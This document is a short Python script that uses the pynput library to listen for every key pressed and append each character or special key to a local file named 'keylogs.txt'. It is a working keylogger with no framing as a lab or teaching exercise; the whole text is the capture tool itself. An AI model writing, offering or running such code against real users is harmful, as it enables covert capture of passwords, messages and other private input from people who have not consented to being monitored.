import pynput.keyboard as keyboard

log_file = 'keylogs.txt'

def on_press(key):
    try:
        with open(log_file, 'a') as f:
            if hasattr(key, 'char'):  # letters and numbers
                f.write(f'{key.char}\n')
            else:   # special keys like enter, tab etc
                f.write(f'{str(key)}\n')
    except AttributeError:
        pass

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
